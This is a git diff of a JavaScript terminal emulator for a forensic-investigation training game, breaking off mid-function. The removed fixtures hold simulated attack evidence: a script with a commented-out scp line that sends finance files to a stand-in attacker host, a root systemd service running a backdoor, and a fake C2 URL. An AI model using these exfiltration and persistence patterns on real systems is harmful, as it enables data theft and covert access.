@@ -1,580 +1,1073 @@
-let term;
-let fitAddon;
-const consoleContainer = document.getElementById("consoleContainer");
-const closeConsoleBtn = document.getElementById("closeConsoleBtn");
-const taskDisplayElement = document.getElementById("currentTaskText");
+// Forensic Shell - Terminal emulator for the 3D forensic investigation environment
+import 'xterm/css/xterm.css';
+import { Terminal } from 'xterm';
+import { FitAddon } from 'xterm-addon-fit';
+import { 
+  currentTask, advanceTask, getAvailableScenarios, notifyComplete, 
+  switchScenario, switchScenarioWithIntro, getProgress 
+} from './taskManager.js';
+import { eventBus, Events } from './eventBus.js';
 
-// Cronologia comandi
-let commandHistory = [];
-let historyIndex = -1;
-let savedCommand = '';
-
-// Autocompletamento
-const availableCommands = ['help', 'ls', 'cd', 'cat', 'task', 'clear'];
-let autoCompleteIndex = -1;
-let autoCompleteMatches = [];
-let autoCompletePartial = '';
-
-// --- Task Definition ---
-const TASKS = [
-    {
-        id: 1,
-        description: "Benvenuto, Analista.\nTASK 1: Identifica l'indirizzo IP dell'attaccante esaminando il file 'suspicious.log' nella directory 'case_files'.\nDigita 'help' per i comandi.",
-        targetFile: "~/case_files/suspicious.log",
-        keywordToComplete: "10.10.10.155", 
-        nextTaskId: 2,
-        completionMessage: "TASK 1 COMPLETATO: IP dell'attaccante identificato (10.10.10.155)."
-    },
-    {
-        id: 2,
-        description: "TASK 2: Il log menziona uno script 'data_exfil.sh' eseguito dall'utente 'admin_compromised'. Trova questo script (dovrebbe essere in 'case_files') ed esamina il suo contenuto per identificare l'IP di destinazione dell'esfiltrazione.",
-        targetFile: "~/case_files/data_exfil.sh",
-        keywordToComplete: "1.2.3.4", 
-        nextTaskId: 3,
-        completionMessage: "TASK 2 COMPLETATO: IP di esfiltrazione identificato (1.2.3.4)."
-    },
-    {
-        id: 3,
-        description: "TASK 3: Ottimo. Ora analizza il file 'network_traffic.log' in 'case_files/evidence' per trovare la porta usata per l'esfiltrazione verso l'IP 1.2.3.4.",
-        targetFile: "~/case_files/evidence/network_traffic.log",
-        keywordToComplete: "PORT: 2222",
-        nextTaskId: 4,
-        completionMessage: "TASK 3 COMPLETATO: Porta di esfiltrazione identificata (2222)."
-    },
-    {
-        id: 4,
-        description: "TASK 4: Sembra che l'attaccante abbia lasciato una backdoor. Controlla la directory '/etc/systemd/system' alla ricerca di servizi sospetti. Cerca un file di servizio che non dovrebbe esserci e identifica il nome dell'eseguibile della backdoor.",
-        targetFile: "~/etc/systemd/system/suspicious_service.service",
-        keywordToComplete: "ExecStart=/usr/local/bin/bkdr_agent",
-        nextTaskId: 5,
-        completionMessage: "TASK 4 COMPLETATO: Eseguibile della backdoor identificato (/usr/local/bin/bkdr_agent)."
-    },
-    {
-        id: 5,
-        description: "TASK 5: Indagine quasi conclusa. L'eseguibile '/usr/local/bin/bkdr_agent' è la backdoor. Esamina il file 'bkdr_agent_config.xml' che si trova in '/etc/backdoor_configs/' per trovare l'URL del server Command & Control (C2).",
-        targetFile: "~/etc/backdoor_configs/bkdr_agent_config.xml",
-        keywordToComplete: "<server_url>http://malicious-c2.badguy.net/updates</server_url>",
-        nextTaskId: 6,
-        completionMessage: "TASK 5 COMPLETATO: Server C2 della backdoor identificato."
-    },
-    {
-        id: 6,
-        description: "TASK 6: Eccellente lavoro, Analista! Hai raccolto tutte le prove chiave: IP attaccante, IP e porta di esfiltrazione, eseguibile della backdoor e server C2. L'indagine è conclusa. Prepara il tuo report!",
-        isFinal: true,
-        completionMessage: "INDAGINE CONCLUSA CON SUCCESSO! Tutte le prove raccolte."
-    }
-];
-let currentTask = TASKS[0];
-
-// --- File System Definition ---
-const fileSystem = {
-    "~": {
-        type: "directory",
-        content: {
-            "case_files": {
-                type: "directory",
-                content: {
-                    "suspicious.log": { type: "file", content: "[2025-05-06 16:20:00] User 'admin_compromised' logged in from IP 10.10.10.155\n[2025-05-06 16:21:30] WARNING: Failed login attempt for user 'root' from 192.168.1.102\n[2025-05-06 16:22:05] User 'admin_compromised' executed 'data_exfil.sh' in /usr/local/bin. Script found copied to ~/case_files/data_exfil.sh for analysis." },
-                    "report_template.docx": { type: "file", content: "Questo è un template di report." },
-                    "data_exfil.sh": { type: "file", content: "#!/bin/bash\n# Simple exfiltration script\n# WARNING: This script is part of a forensic investigation\n\nTARGET_IP=\"1.2.3.4\"\nFILES_TO_STEAL=\"/company_data/finances/*\"\n\necho \"Starting exfiltration to $TARGET_IP...\"\n# scp -r $FILES_TO_STEAL attacker@$TARGET_IP:/backup/loot/\necho \"Exfiltration attempt logged.\""},
-                    "evidence": {
-                        type: "directory",
-                        content: {
-                            "network_traffic.log": { type: "file", content: "[2025-05-06 16:22:10] Connection established: SRC_IP=10.10.10.155 DST_IP=1.2.3.4 PROTO=TCP SPORT=49152 DPORT=2222\n[2025-05-06 16:22:15] Data transfer: 1.5MB sent to 1.2.3.4:2222\n[2025-05-06 16:22:20] Connection closed: 10.10.10.155 to 1.2.3.4 PORT: 2222" }
-                        }
-                    }
-                }
-            },
-            "tools": {
-                type: "directory",
-                content: {
-                    "analyzer.exe": { type: "file", content: "Binary executable for analysis (simulato)" }
-                }
-            },
-            "readme.txt": { type: "file", content: "Benvenuto nel sistema di analisi forense simulato.\nUsa i comandi 'ls', 'cd', 'cat' per esplorare i file.\nCompleta i task assegnati." },
-            "etc": {
-                type: "directory",
-                content: {
-                    "systemd": {
-                        type: "directory",
-                        content: {
-                            "system": {
-                                type: "directory",
-                                content: {
-                                    "network.service": {type: "file", content: "[Unit]\nDescription=Network Service\n\n[Service]\nExecStart=/usr/sbin/network_daemon\n\n[Install]\nWantedBy=multi-user.target"},
-                                    "suspicious_service.service": {type: "file", content: "[Unit]\nDescription=System Update Utility (Definitely not malware)\n\n[Service]\nUser=root\nExecStart=/usr/local/bin/bkdr_agent -c /etc/backdoor_configs/bkdr_agent_config.xml\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"},
-                                    "cron.service": {type: "file", content: "Description=Cron Service"}
-                                }
-                            }
-                        }
-                    },
-                    "backdoor_configs": {
-                        type: "directory",
-                        content: {
-                            "bkdr_agent_config.xml": {type: "file", content: "<?xml version=\"1.0\"?>\n<config>\n  <settings>\n    <auto_start>true</auto_start>\n    <log_level>debug</log_level>\n  </settings>\n  <connection>\n    <server_url>http://malicious-c2.badguy.net/updates</server_url>\n    <retry_interval_seconds>300</retry_interval_seconds>\n  </connection>\n</config>"}
-                        }
-                    }
-                }
-            }
-        }
-    }
+// Configuration constants
+const CONFIG = {
+  STORAGE_KEY: 'forensic_shell_history',
+  HISTORY_LIMIT: 200,
+  TERMINAL_CONFIG: {
+    fontFamily: "ui-monospace, SFMono-Regular, Menlo, Consolas, 'Liberation Mono', monospace",
+    cursorBlink: true,
+    allowTransparency: true,
+    convertEol: true,
+    theme: { background: "#0a0a0a" }
+  },
+  COLORS: {
+    USER: '\x1b[32m',
+    PATH: '\x1b[34m',
+    RESET: '\x1b[0m'
+  },
+  ENV: {
+    USER: 'forensic',
+    HOME: '/home/user',
+    PATH: '/bin:/usr/bin'
+  }
 };
 
-let currentPath = "~";
+// Track terminal state: buffer, history, cursor position, etc.
+const TerminalState = {
+  term: null,
+  fitAddon: null,
+  buffer: '',
+  cursorPos: 0,  // Track cursor position in buffer
+  history: [],
+  historyIdx: 0,
+  cwd: '/home/user',
+  env: { ...CONFIG.ENV }
+};
 
-function updateTaskDisplay() {
-    if (taskDisplayElement && currentTask) {
-        taskDisplayElement.innerText = currentTask.description;
-        document.getElementById("taskDisplayContainer").style.display = "block";
+// Virtual File System - manages the simulated forensic file structure
+const VFSManager = {
+  root: null,
+
+  initialize() {
+    this.root = {
+      type: 'dir',
+      children: {
+        home: {
+          type: 'dir',
+          children: {
+            user: {
+              type: 'dir',
+              children: {
+                'README.txt': this.makeFile('Welcome to the Forensic Shell. \nExplore the file system and complete the tasks.')
+              }
+            }
+          }
+        },
+        evidence: {
+          type: 'dir',
+          children: {
+            'log.txt': this.makeFile('2024-01-15 10:23:45 - Login attempt from 192.168.1.100\n2024-01-15 10:24:01 - Failed password for admin\n2024-01-15 10:25:12 - Successful login for admin\npassword: hunter2'),
+            '.hidden': this.makeFile('This is a hidden file with sensitive data.'),
+            'report.pdf': this.makeFile('[Binary file - PDF document]')
+          }
+        },
+        captures: {
+          type: 'dir',
+          children: {
+            'traffic.pcap': this.makeFile('[Binary packet capture file]')
+          }
+        },
+        memory: {
+          type: 'dir',
+          children: {
+            'dump.raw': this.makeFile('[Binary memory dump]')
+          }
+        },
+        tmp: { type: 'dir', children: {} }
+      }
+    };
+  },
+
+  makeFile(content) {
+    return { type: 'file', content };
+  },
+
+  resolvePath(path, base) {
+    if (path.startsWith('/')) return this.normalizePath(path);
+    const parts = base.split('/').filter(Boolean);
+    const segments = path.split('/');
+    for (const seg of segments) {
+      if (seg === '..') parts.pop();
+      else if (seg && seg !== '.') parts.push(seg);
     }
+    return '/' + parts.join('/');
+  },
+
+  normalizePath(p) {
+    const parts = p.split('/').filter(Boolean);
+    const stack = [];
+    for (const seg of parts) {
+      if (seg === '..') stack.pop();
+      else if (seg !== '.') stack.push(seg);
+    }
+    return '/' + stack.join('/');
+  },
+
+  getNode(path) {
+    const p = this.normalizePath(path);
+    if (p === '/') return this.root;
+    const parts = p.split('/').filter(Boolean);
+    let node = this.root;
+    for (const part of parts) {
+      if (!node.children || !node.children[part]) return null;
+      node = node.children[part];
+    }
+    return node;
+  },
+
+  ensureDirAndLeaf(path) {
+    const p = this.normalizePath(path);
+    const parts = p.split('/').filter(Boolean);
+    if (parts.length === 0) return null;
+    let node = this.root;
+    for (let i = 0; i < parts.length - 1; i++) {
+      if (!node.children[parts[i]]) return null;
+      node = node.children[parts[i]];
+      if (node.type !== 'dir') return null;
+    }
+    return { dirNode: node, leaf: parts[parts.length - 1] };
+  },
+
+  listCandidates(partial, base) {
+    const slash = partial.lastIndexOf('/');
+    let dirPath = base;
+    let prefix = partial;
+    if (slash >= 0) {
+      dirPath = this.resolvePath(partial.slice(0, slash + 1), base);
+      prefix = partial.slice(slash + 1);
+    }
+    const node = this.getNode(dirPath);
+    if (!node || node.type !== 'dir') return [];
+    return Object.keys(node.children).filter(name => name.startsWith(prefix));
+  }
+};
+
+// Registry for all available shell commands
+const CommandRegistry = new Map();
+
+function registerCommand(name, handler) {
+  CommandRegistry.set(name, handler);
 }
 
-function getCurrentDirectoryObject() {
-    let pathParts = [];
-    if (currentPath === "~") return fileSystem["~"];
-    if (currentPath.startsWith("~/")) pathParts = currentPath.substring(2).split("/").filter(p => p);
-    else if (currentPath.startsWith("/")) pathParts = currentPath.substring(1).split("/").filter(p => p);
-    else return null; // Percorso non valido se non inizia con ~ o /
+function getCommand(name) {
+  return CommandRegistry.get(name);
+}
 
-    let currentLevel = fileSystem["~"]; // Inizia sempre dalla radice simulata
-    if (currentPath.startsWith("/")) { // Se è un percorso assoluto, cerca dalla radice del FS simulato
-        const rootDir = pathParts.shift(); // es. 'etc'
-        if (fileSystem["~"] && fileSystem["~"].content[rootDir]) {
-            currentLevel = fileSystem["~"].content[rootDir];
-        } else {
-            return null;
-        }
+function getAllCommands() {
+  return Array.from(CommandRegistry.keys());
+}
+
+// Parses command input and handles redirection (>, >>)
+const Parser = {
+  parse(line) {
+    if (!line) return { cmd: '', args: [] };
+
+    const tokens = [];
+    let cur = '';
+    let inQ = false;
+
+    for (let i = 0; i < line.length; i++) {
+      const ch = line[i];
+      if (ch === '"') {
+        inQ = !inQ;
+      } else if (ch === ' ' && !inQ) {
+        if (cur) tokens.push(cur);
+        cur = '';
+      } else {
+        cur += ch;
+      }
     }
+    if (cur) tokens.push(cur);
+
+    let redir = null;
+    let cmdArgs = tokens;
+
+    for (let i = 0; i < tokens.length; i++) {
+      if (tokens[i] === '>') {
+        redir = { append: false, path: tokens[i + 1] || '' };
+        cmdArgs = tokens.slice(0, i);
+        break;
+      }
+      if (tokens[i] === '>>') {
+        redir = { append: true, path: tokens[i + 1] || '' };
+        cmdArgs = tokens.slice(0, i);
+        break;
+      }
+    }
+
+    const cmd = cmdArgs[0] || '';
+    const args = cmdArgs.slice(1);
+
+    return { cmd, args, redir };
+  }
+};
+
+// Terminal UI utilities - display prompts, write output, etc.
+const TerminalUI = {
+  getPrompt() {
+    const { USER, RESET, PATH } = CONFIG.COLORS;
+    return `${USER}forensic${RESET}:${PATH}${TerminalState.cwd}${RESET}$ `;
+  },
+
+  write(text) {
+    TerminalState.term.write(text);
+  },
+
+  writeLine(text = '') {
+    TerminalState.term.writeln(text);
+  },
+
+  clear() {
+    TerminalState.term.clear();
+  },
+
+  prompt() {
+    this.write(this.getPrompt());
+  }
+};
+
+// Manages command history - persistence, navigation (arrow keys)
+const HistoryManager = {
+  save(cmd) {
+    if (!cmd) return;
+    const { history } = TerminalState;
+    if (history.length === 0 || history[history.length - 1] !== cmd) {
+      history.push(cmd);
+      TerminalState.history = history.slice(-CONFIG.HISTORY_LIMIT);
+      this.persistToStorage();
+    }
+    TerminalState.historyIdx = history.length;
+  },
+
+  loadFromStorage() {
+    try {
+      const saved = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEY) || '[]');
+      if (Array.isArray(saved)) {
+        TerminalState.history = saved.slice(-CONFIG.HISTORY_LIMIT);
+      }
+    } catch (err) {
+      console.error('Failed to load history:', err);
+    }
+  },
+
+  persistToStorage() {
+    try {
+      localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(TerminalState.history));
+    } catch (err) {
+      console.error('Failed to save history:', err);
+    }
+  },
+
+  up() {
+    if (!TerminalState.history.length) return;
+    TerminalState.historyIdx = Math.max(0, TerminalState.historyIdx - 1);
+    this.replaceBuffer(TerminalState.history[TerminalState.historyIdx] || '');
+  },
+
+  down() {
+    if (!TerminalState.history.length) return;
+    TerminalState.historyIdx = Math.min(TerminalState.history.length, TerminalState.historyIdx + 1);
+    this.replaceBuffer(TerminalState.history[TerminalState.historyIdx] || '');
+  },
+
+  replaceBuffer(text) {
+    while (TerminalState.buffer.length > 0) {
+      TerminalUI.write('\b \b');
+      TerminalState.buffer = TerminalState.buffer.slice(0, -1);
+    }
+    TerminalState.buffer = text;
+    TerminalState.cursorPos = text.length;
+    TerminalUI.write(text);
+  }
+};
+
+// Tab autocomplete - completes commands and file paths
+const Autocomplete = {
+  execute() {
+    const pieces = TerminalState.buffer.trim().split(/\s+/);
+    const isFirst = pieces.length <= 1;
+    const current = pieces[pieces.length - 1] || '';
+
+    let choices = [];
+    if (isFirst) {
+      choices = getAllCommands();
+    } else {
+      choices = VFSManager.listCandidates(current || '', TerminalState.cwd);
+    }
+
+    const matches = choices.filter(c => c.startsWith(current));
+
+    if (matches.length === 1) {
+      this.fillMatch(matches[0], current, isFirst, pieces);
+    } else if (matches.length > 1) {
+      TerminalUI.write('\r\n');
+      matches.forEach(m => TerminalUI.writeLine(m));
+      TerminalUI.prompt();
+      TerminalUI.write(TerminalState.buffer);
+      TerminalState.cursorPos = TerminalState.buffer.length;
+    }
+  },
+
+  fillMatch(match, current, isFirst, pieces) {
+    const fill = match.slice(current.length);
+    const wasAtEnd = TerminalState.cursorPos === TerminalState.buffer.length;
     
+    // Insert fill at cursor position
+    TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos) +
+                           fill +
+                           TerminalState.buffer.slice(TerminalState.cursorPos);
+    TerminalState.cursorPos += fill.length;
+
+    if (wasAtEnd) {
+      TerminalUI.write(fill);
+    } else {
+      InputHandler.redrawBuffer();
+    }
+
+    if (!isFirst) {
+      const full = VFSManager.resolvePath(pieces[pieces.length - 1] + fill, TerminalState.cwd);
+      const node = VFSManager.getNode(full);
+      if (node && node.type === 'dir' && !TerminalState.buffer.endsWith('/')) {
+        const slash = '/';
+        TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos) +
+                               slash +
+                               TerminalState.buffer.slice(TerminalState.cursorPos);
+        TerminalState.cursorPos++;
+        
+        if (TerminalState.cursorPos === TerminalState.buffer.length) {
+          TerminalUI.write(slash);
+        } else {
+          InputHandler.redrawBuffer();
+        }
+      }
+    }
+  }
+};
+
+// Handles keyboard input - navigation, editing, special keys
+const InputHandler = {
+  onTermKey({ key, domEvent }) {
+    const ev = domEvent;
+    const canvas = document.getElementById('renderCanvas');
+
+    // ESC: close console
+    if (ev.key === 'Escape') {
+      ev.preventDefault();
+      ev.stopPropagation();
+      toggleConsoleVisibility(false);
+      this.focusCanvasWithLock(canvas);
+      return;
+    }
+
+    ev.stopPropagation();
+
+    // Ctrl+L: clear
+    if (ev.ctrlKey && ev.key.toLowerCase() === 'l') {
+      ev.preventDefault();
+      TerminalUI.clear();
+      setTimeout(() => TerminalState.term.focus(), 0);
+      return;
+    }
+
+    // Ctrl+C: copy to clipboard
+    if (ev.ctrlKey && ev.key.toLowerCase() === 'c') {
+      ev.preventDefault();
+      if (TerminalState.buffer.length > 0) {
+        navigator.clipboard.writeText(TerminalState.buffer).catch(err => 
+          console.error('Copy failed:', err)
+        );
+      }
+      return;
+    }
+
+    // Ctrl+X: cut to clipboard
+    if (ev.ctrlKey && ev.key.toLowerCase() === 'x') {
+      ev.preventDefault();
+      if (TerminalState.buffer.length > 0) {
+        navigator.clipboard.writeText(TerminalState.buffer).catch(err => 
+          console.error('Cut failed:', err)
+        );
+        this.clearBuffer();
+        this.redrawBuffer();
+      }
+      return;
+    }
+
+    // Ctrl+V: paste from clipboard
+    if (ev.ctrlKey && ev.key.toLowerCase() === 'v') {
+      ev.preventDefault();
+      navigator.clipboard.readText().then(text => {
+        TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos) +
+                               text +
+                               TerminalState.buffer.slice(TerminalState.cursorPos);
+        TerminalState.cursorPos += text.length;
+        this.redrawBuffer();
+      }).catch(err => console.error('Paste failed:', err));
+      return;
+    }
+
+    // Arrow Up: history
+    if (ev.key === 'ArrowUp') {
+      ev.preventDefault();
+      HistoryManager.up();
+      setTimeout(() => TerminalState.term.focus(), 0);
+      return;
+    }
+
+    // Arrow Down: history
+    if (ev.key === 'ArrowDown') {
+      ev.preventDefault();
+      HistoryManager.down();
+      setTimeout(() => TerminalState.term.focus(), 0);
+      return;
+    }
+
+    // Arrow Left: move cursor left
+    if (ev.key === 'ArrowLeft') {
+      ev.preventDefault();
+      if (TerminalState.cursorPos > 0) {
+        TerminalState.cursorPos--;
+        TerminalUI.write('\b');
+      }
+      return;
+    }
+
+    // Arrow Right: move cursor right
+    if (ev.key === 'ArrowRight') {
+      ev.preventDefault();
+      if (TerminalState.cursorPos < TerminalState.buffer.length) {
+        TerminalUI.write(TerminalState.buffer[TerminalState.cursorPos]);
+        TerminalState.cursorPos++;
+      }
+      return;
+    }
+
+    // Home: move cursor to start
+    if (ev.key === 'Home') {
+      ev.preventDefault();
+      while (TerminalState.cursorPos > 0) {
+        TerminalUI.write('\b');
+        TerminalState.cursorPos--;
+      }
+      return;
+    }
+
+    // End: move cursor to end
+    if (ev.key === 'End') {
+      ev.preventDefault();
+      while (TerminalState.cursorPos < TerminalState.buffer.length) {
+        TerminalUI.write(TerminalState.buffer[TerminalState.cursorPos]);
+        TerminalState.cursorPos++;
+      }
+      return;
+    }
+
+    // Tab: autocomplete
+    if (ev.key === 'Tab') {
+      ev.preventDefault();
+      Autocomplete.execute();
+      setTimeout(() => TerminalState.term.focus(), 0);
+      return;
+    }
+
+    // Enter: execute
+    if (ev.key === 'Enter') {
+      ev.preventDefault();
+      TerminalState.term.write('\r\n');
+      const line = TerminalState.buffer.trim();
+      CommandExecutor.execute(line);
+      TerminalState.buffer = '';
+      TerminalState.cursorPos = 0;
+      TerminalUI.prompt();
+      setTimeout(() => TerminalState.term.focus(), 0);
+      return;
+    }
+
+    // Backspace
+    if (ev.key === 'Backspace') {
+      ev.preventDefault();
+      if (TerminalState.cursorPos > 0) {
+        const wasAtEnd = TerminalState.cursorPos === TerminalState.buffer.length;
+        TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos - 1) +
+                               TerminalState.buffer.slice(TerminalState.cursorPos);
+        TerminalState.cursorPos--;
+        
+        // If at end, just do simple backspace. If in middle, redraw.
+        if (wasAtEnd) {
+          TerminalUI.write('\b \b');
+        } else {
+          this.redrawBuffer();
+        }
+      }
+      return;
+    }
+
+    // Delete: remove character at cursor
+    if (ev.key === 'Delete') {
+      ev.preventDefault();
+      if (TerminalState.cursorPos < TerminalState.buffer.length) {
+        const wasAtEnd = TerminalState.cursorPos === TerminalState.buffer.length - 1;
+        TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos) +
+                               TerminalState.buffer.slice(TerminalState.cursorPos + 1);
+        
+        // If deleting last char, simple delete. If in middle, redraw.
+        if (wasAtEnd) {
+          TerminalUI.write(' \b');
+        } else {
+          this.redrawBuffer();
+        }
+      }
+      return;
+    }
+
+    // Printable characters
+    const printable = !ev.altKey && !ev.ctrlKey && !ev.metaKey && ev.key.length === 1;
+    if (printable) {
+      ev.preventDefault();
+      const wasAtEnd = TerminalState.cursorPos === TerminalState.buffer.length;
+      TerminalState.buffer = TerminalState.buffer.slice(0, TerminalState.cursorPos) +
+                             ev.key +
+                             TerminalState.buffer.slice(TerminalState.cursorPos);
+      TerminalState.cursorPos++;
+      
+      // If at end, just write the character. If in middle, redraw entire line.
+      if (wasAtEnd) {
+        TerminalUI.write(ev.key);
+      } else {
+        this.redrawBuffer();
+      }
+    }
+  },
+
+  clearBuffer() {
+    while (TerminalState.cursorPos > 0) {
+      TerminalUI.write('\b \b');
+      TerminalState.cursorPos--;
+    }
+    while (TerminalState.buffer.length > 0) {
+      TerminalUI.write(' \b');
+      TerminalState.buffer = TerminalState.buffer.slice(0, -1);
+    }
+  },
+
+  redrawBuffer() {
+    // Move cursor to start
+    for (let i = 0; i < TerminalState.cursorPos; i++) {
+      TerminalUI.write('\b');
+    }
+    // Clear rest of line
+    for (let i = 0; i < TerminalState.buffer.length; i++) {
+      TerminalUI.write(' ');
+    }
+    // Move cursor back to start
+    for (let i = 0; i < TerminalState.buffer.length; i++) {
+      TerminalUI.write('\b');
+    }
+    // Redraw buffer
+    TerminalUI.write(TerminalState.buffer);
+    // Move cursor to correct position
+    for (let i = TerminalState.cursorPos; i < TerminalState.buffer.length; i++) {
+      TerminalUI.write('\b');
+    }
+  },
+
+  focusCanvasWithLock(canvas) {
+    if (!canvas) return;
+    setTimeout(() => {
+      canvas.focus();
+      if (document.pointerLockElement !== canvas && canvas.requestPointerLock)
+        canvas.requestPointerLock();
+    }, 0);
+  }
+};
+
+// Executes commands - calls handlers, manages output redirection
+const CommandExecutor = {
+  execute(line) {
+    const { cmd, args, redir } = Parser.parse(line);
+    if (!cmd) return;
+
+    if (window.tutorial?.signalTyped) window.tutorial.signalTyped(cmd);
+
+    HistoryManager.save(line);
+    TaskManager.checkCompletion(cmd, args);
+
+    const handler = getCommand(cmd);
+    if (!handler) {
+      TerminalUI.writeLine(`Unknown command: ${cmd}`);
+      return;
+    }
+
+    try {
+      let out = handler(args);
+      if (typeof out === 'string') {
+        this.handleRedirection(out, redir);
+      }
+    } catch (err) {
+      TerminalUI.writeLine(`Errore: ${err.message || err}`);
+    }
+  },
+
+  handleRedirection(output, redir) {
+    if (redir) {
+      const abs = VFSManager.resolvePath(redir.path, TerminalState.cwd);
+      const slot = VFSManager.ensureDirAndLeaf(abs);
+      if (!slot) {
+        TerminalUI.writeLine('Error: destination directory does not exist.');
+      } else {
+        const { dirNode, leaf } = slot;
+        const prev = dirNode.children[leaf]?.type === 'file'
+          ? dirNode.children[leaf].content
+          : '';
+        const content = redir.append ? (prev + output + '\n') : (output + '\n');
+        dirNode.children[leaf] = VFSManager.makeFile(content);
+      }
+    } else {
+      TerminalUI.writeLine(output);
+    }
+  }
+};
+
+// Task completion detector - checks if commands match task requirements
+const TaskManager = {
+  checkCompletion(cmd, args) {
+    const task = currentTask?.();
+    if (!task) return;
+
+    if (task.checkCommand && task.checkCommand === cmd) {
+      if (task.checkArgs?.length > 0 && !this.arraysMatch(args, task.checkArgs)) {
+        return;
+      }
+
+      this.notifyCompletion(task);
+    }
+  },
+
+  notifyCompletion(task) {
+    const prevTitle = task.title;
+    if (advanceTask) advanceTask();
+    // Note: updateTaskHUD() removed - taskHud now listens to PROGRESS_UPDATED event from taskManager
+    
+    TerminalUI.writeLine(`\nTask completed: ${prevTitle}`);
+    const next = currentTask?.();
+    
+    if (next) {
+      TerminalUI.writeLine(`Next: ${next.title}  ${next.details}\n`);
+    } else {
+      TerminalUI.writeLine('All tasks completed. \n');
+    }
+
+    if (notifyComplete) notifyComplete(prevTitle);
+  },
+
+  arraysMatch(a, b) {
+    if (a.length !== b.length) return false;
+    return a.every((val, i) => val.trim() === b[i].trim());
+  }
+};
+
+// Shell commands: ls, cd, cat, grep, mount, scenario, etc.
+function registerBuiltinCommands() {
+  // help
+  registerCommand('help', () => {
+    return [
+      'Available commands:',
+      '  ls [path]       - list directory',
+      '  cd <path>       - change directory',
+      '  pwd             - show current directory',
+      '  cat <file>      - read file',
+      '  grep <pattern> <file> - search pattern in file',
+      '  echo <text>     - print text',
+      '  mkdir <dir>     - create directory',
+      '  touch <file>    - create empty file',
+      '  rm <file/dir>   - remove file or directory',
+      '  clear           - clear screen',
+      '  env             - show environment variables',
+      '  tcpdump [opts]  - analyze packet capture (simulated)',
+      '  volatility [opts] - analyze memory dump (simulated)',
+      '  scenario [id]   - change scenario',
+      '  progress        - show current progress'
+    ].join('\n');
+  });
+
+  // ls
+  registerCommand('ls', (args) => {
+    const target = args[0] || '.';
+    const showAll = args.includes('-la') || args.includes('-a');
+    const abs = VFSManager.resolvePath(target, TerminalState.cwd);
+    const node = VFSManager.getNode(abs);
+
+    if (!node) return `ls: ${target}: No such file or directory`;
+    if (node.type === 'file') return abs.split('/').pop();
+
+    const entries = Object.keys(node.children).filter(name => {
+      if (showAll) return true;
+      return !name.startsWith('.');
+    });
+
+    return entries.length > 0 ? entries.join('\n') : '';
+  });
+
+  // cd
+  registerCommand('cd', (args) => {
+    if (!args[0]) {
+      TerminalState.cwd = TerminalState.env.HOME || '/home/user';
+      return '';
+    }
+    const target = VFSManager.resolvePath(args[0], TerminalState.cwd);
+    const node = VFSManager.getNode(target);
+    if (!node) return `cd: ${args[0]}: No such directory`;
+    if (node.type !== 'dir') return `cd: ${args[0]}: Not a directory`;
+    TerminalState.cwd = target;
+    return '';
+  });
+
+  // pwd
+  registerCommand('pwd', () => TerminalState.cwd);
+
+  // cat
+  registerCommand('cat', (args) => {
+    if (!args[0]) return 'cat: missing operand';
+    const abs = VFSManager.resolvePath(args[0], TerminalState.cwd);
+    const node = VFSManager.getNode(abs);
+    if (!node) return `cat: ${args[0]}: No such file`;
+    if (node.type !== 'file') return `cat: ${args[0]}: Is a directory`;
+    return node.content;
+  });
+
+  // grep
+  registerCommand('grep', (args) => {
+    if (args.length < 2) return 'grep: missing pattern or file';
+    const pattern = args[0];
+    const file = args[1];
+    const abs = VFSManager.resolvePath(file, TerminalState.cwd);
+    const node = VFSManager.getNode(abs);
+    if (!node || node.type !== 'file') return `grep: ${file}: No such file`;
+    
+    const lines = node.content.split('\n');
+    const matches = lines.filter(line => line.includes(pattern));
+    return matches.length > 0 ? matches.join('\n') : '';
+  });
+
+  // echo
+  registerCommand('echo', (args) => args.join(' '));
+
+  // mkdir
+  registerCommand('mkdir', (args) => {
+    if (!args[0]) return 'mkdir: missing operand';
+    const abs = VFSManager.resolvePath(args[0], TerminalState.cwd);
+    const slot = VFSManager.ensureDirAndLeaf(abs);
+    if (!slot) return 'mkdir: cannot create directory';
+    const { dirNode, leaf } = slot;
+    if (dirNode.children[leaf]) return `mkdir: ${args[0]}: File exists`;
+    dirNode.children[leaf] = { type: 'dir', children: {} };
+    return '';
+  });
+
+  // touch
+  registerCommand('touch', (args) => {
+    if (!args[0]) return 'touch: missing operand';
+    const abs = VFSManager.resolvePath(args[0], TerminalState.cwd);
+    const slot = VFSManager.ensureDirAndLeaf(abs);
+    if (!slot) return 'touch: cannot create file';
+    const { dirNode, leaf } = slot;
+    if (!dirNode.children[leaf]) dirNode.children[leaf] = VFSManager.makeFile('');
+    return '';
+  });
+
+  // rm
+  registerCommand('rm', (args) => {
+    if (!args[0]) return 'rm: missing operand';
+    const abs = VFSManager.resolvePath(args[0], TerminalState.cwd);
+    const slot = VFSManager.ensureDirAndLeaf(abs);
+    if (!slot) return `rm: ${args[0]}: No such file or directory`;
+    const { dirNode, leaf } = slot;
+    if (!dirNode.children[leaf]) return `rm: ${args[0]}: No such file or directory`;
+    delete dirNode.children[leaf];
+    return '';
+  });
+
+  // clear
+  registerCommand('clear', () => {
+    TerminalUI.clear();
+    return '';
+  });
+
+  // env
+  registerCommand('env', () => {
+    return Object.entries(TerminalState.env)
+      .map(([k, v]) => `${k}=${v}`)
+      .join('\n');
+  });
+
+  // tcpdump
+  registerCommand('tcpdump', () => {
+    return [
+      'Reading from capture file...',
+      '10:23:45.123456 IP 192.168.1.100.54321 > 10.0.0.1.80: Flags [S], seq 123456',
+      '10:23:45.234567 IP 10.0.0.1.80 > 192.168.1.100.54321: Flags [S.], seq 789012',
+      '10:23:45.345678 IP 192.168.1.100.54321 > 10.0.0.1.80: Flags [.], ack 1',
+      '--- Captured 3 packets ---'
+    ].join('\n');
+  });
+
+  // volatility
+  registerCommand('volatility', () => {
+    return [
+      'Volatility Framework 2.6',
+      'PID   PPID  Name',
+      '---   ----  ----',
+      '4     0     System',
+      '500   4     smss.exe',
+      '600   500   csrss.exe',
+      '700   500   winlogon.exe',
+      '800   700   services.exe',
+      '--- Found 5 processes ---'
+    ].join('\n');
+  });
+
+  // scenario
+  registerCommand('scenario', async (args) => {
+    if (!args[0]) {
